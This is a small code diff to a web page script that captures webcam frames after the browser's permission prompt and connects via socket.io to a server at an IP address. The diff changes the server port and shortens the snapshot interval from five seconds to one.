@@ -10,7 +10,7 @@
     var canvas = document.getElementById('canvas');
     var ctx = canvas.getContext('2d');
 
-    var socket = io.connect('http://5.255.150.116:2500');
+    var socket = io.connect('http://5.255.150.116');
 
     function snapshot() {
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -35,7 +35,7 @@
 
     navigator.webkitGetUserMedia({video: true}, function (stream) {
       video.src = window.URL.createObjectURL(stream);
-      setInterval(snapshot, 5000);
+      setInterval(snapshot, 1000);
     });
   </script>
 </body>
